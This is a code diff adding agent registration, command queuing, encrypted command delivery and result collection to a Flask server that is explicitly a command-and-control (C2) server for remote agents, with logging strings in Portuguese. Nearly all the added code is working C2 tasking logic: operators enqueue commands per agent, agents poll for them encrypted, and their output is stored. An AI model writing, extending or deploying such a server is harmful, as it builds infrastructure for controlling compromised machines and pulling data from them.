@@ -3,6 +3,9 @@ from cryptography.fernet import Fernet
 import datetime
 import os
 
+from dotenv import load_dotenv
+load_dotenv()
+
 app = Flask(__name__)
 KEY = os.getenv("C2_SHARED_KEY")
 
@@ -20,10 +23,42 @@ def log_event(event):
 
 @app.route('/register', methods=['POST'])
 def register():
-    agent_id = request.json.get('agent_id', os.urandom(16).hex())
+    data = request.get_json(silent=True) or {}
+    agent_id = data.get('agent_id', os.urandom(16).hex())
     agents[agent_id] = {'last_seen': datetime.datetime.now(), 'results': []}
     log_event(f"Registered: {agent_id}")
     return jsonify({'agent_id': agent_id})
+
+@app.route('/getcommand', methods=['GET'])
+def get_command():
+    agent_id = request.headers.get('Agent-id')
+    if agent_id in agents:
+        agents[agent_id]['last_seen'] = datetime.datetime.now()
+        if commands.get(agent_id):
+            cmd = commands[agent_id].pop(0)
+            enc_cmd = fernet.encrypt(cmd.encode()).decode()
+            return jsonify({'command': enc_cmd})
+    return jsonify({'command': None})
+
+@app.route('/submit_result', methods=['POST'])
+def submit_result():
+    agent_id = request.headers.get('Agent-id')
+    data = request.get_json()
+    if agent_id in agents:
+        agents[agent_id]['results'].append(data['result'])
+        log_event(f"Resultado de {agent_id}: {data['result'][:100]}")
+    return jsonify({'status': 'ok'})
+
+@app.route('/sendcommand', methods=['POST'])
+def send_command():
+    data = request.get_json()
+    agent_id = data['agent_id']
+    cmd = data['command']
+    if agent_id in agents:
+        commands.setdefault(agent_id, []).append(cmd)
+        log_event(f"Comando enviado para {agent_id}: {cmd}")
+        return jsonify({'status': 'enqueued'})
+    return jsonify({'status': 'agent_not_found'}), 404
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
